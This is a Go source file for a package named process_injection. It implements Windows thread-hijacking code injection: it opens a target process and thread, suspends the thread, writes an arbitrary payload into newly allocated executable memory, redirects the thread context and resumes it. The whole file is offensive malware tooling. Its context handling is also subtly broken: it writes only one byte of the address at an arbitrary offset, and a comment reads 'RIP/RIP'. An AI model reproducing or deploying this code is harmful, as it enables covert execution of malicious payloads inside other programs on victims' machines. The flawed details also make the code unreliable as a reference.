package process_injection

import (
"syscall"
"unsafe"
)

type ThreadHijacking struct{}

func NewThreadHijacking() *ThreadHijacking {
return &ThreadHijacking{}
}

func (t *ThreadHijacking) Hijack(pid int, tid int, payload []byte) error {
kernel32 := syscall.NewLazyDLL("kernel32.dll")
procOpenProcess := kernel32.NewProc("OpenProcess")
procOpenThread := kernel32.NewProc("OpenThread")
procVirtualAllocEx := kernel32.NewProc("VirtualAllocEx")
procWriteProcessMemory := kernel32.NewProc("WriteProcessMemory")
procGetThreadContext := kernel32.NewProc("GetThreadContext")
procSetThreadContext := kernel32.NewProc("SetThreadContext")
procResumeThread := kernel32.NewProc("ResumeThread")
procSuspendThread := kernel32.NewProc("SuspendThread")

handle, _, _ := procOpenProcess.Call(0x1F0FFF, 0, uintptr(pid))

threadHandle, _, _ := procOpenThread.Call(0x1F03FF, 0, uintptr(tid))

procSuspendThread.Call(threadHandle)

addr, _, _ := procVirtualAllocEx.Call(handle, 0, uintptr(len(payload)), 0x3000, 0x40)
var written uintptr
procWriteProcessMemory.Call(handle, addr, uintptr(unsafe.Pointer(&payload[0])), uintptr(len(payload)), uintptr(unsafe.Pointer(&written)))

// Set thread context to execute payload
var ctx [1024]byte
procGetThreadContext.Call(threadHandle, uintptr(unsafe.Pointer(&ctx)))
// Modify RIP/RIP to point to payload
ctx[0x10] = byte(addr)
procSetThreadContext.Call(threadHandle, uintptr(unsafe.Pointer(&ctx)))

procResumeThread.Call(threadHandle)

return nil
}
